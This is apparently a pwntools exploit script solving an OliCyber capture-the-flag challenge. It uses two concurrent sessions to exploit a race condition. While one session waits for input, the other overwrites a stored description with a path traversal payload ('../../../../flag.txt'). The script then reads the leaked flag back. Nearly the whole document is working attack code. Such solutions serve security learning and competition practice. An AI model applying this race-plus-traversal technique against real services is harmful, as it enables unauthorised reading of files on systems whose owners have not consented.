#!/usr/bin/env python3

from pwn import *
from Crypto.Util.number import long_to_bytes

elf = ELF("./m3_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("mmm.challs.olicyber.it", 16009)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    r.sendlineafter(b"selection:", b"1")
    r.sendlineafter(b"price:", b"10")
    r.sendlineafter(b"):", b"hi!!!")
    r.recvuntil(b"ID: ")
    id = r.recvline().strip().decode()
    r.recvuntil(b"token: ")
    token = r.recvline().strip().decode()
    log.info(f"Saved file {id} with token {token}")

    r.sendlineafter(b"selection:", b"2")
    r.sendlineafter(b"ID:", id.encode())
    
    r2 = conn()
    r2.sendlineafter(b"selection:", b"2")
    r2.sendlineafter(b"ID:", id.encode())
    r2.sendlineafter(b"token:", token.encode())
    r2.sendlineafter(b"selection:", b"2")   # edit description
    
    payload = b"a"*0x20 + b"../../../../../../../../flag.txt" + b"c"*31
    r2.sendlineafter(b"):", payload)        # change description while other file is waiting for input
    r2.sendlineafter(b"selection:", b"3")   # save to file
    r2.close()

    sleep(1)

    r.sendlineafter(b"token:", token.encode())
    r.sendlineafter(b"selection:", b"4")

    r.recvuntil(b"token: ")
    print(r.recvline().strip().decode(), end="")

    r.recvuntil(b"price: ")
    print(long_to_bytes(int(r.recvline().strip().decode())).decode()[::-1], end="")

    r.recvuntil(b"description: \n")
    print(r.recvline().strip().decode())

    r.close()


if __name__ == "__main__":
    main()
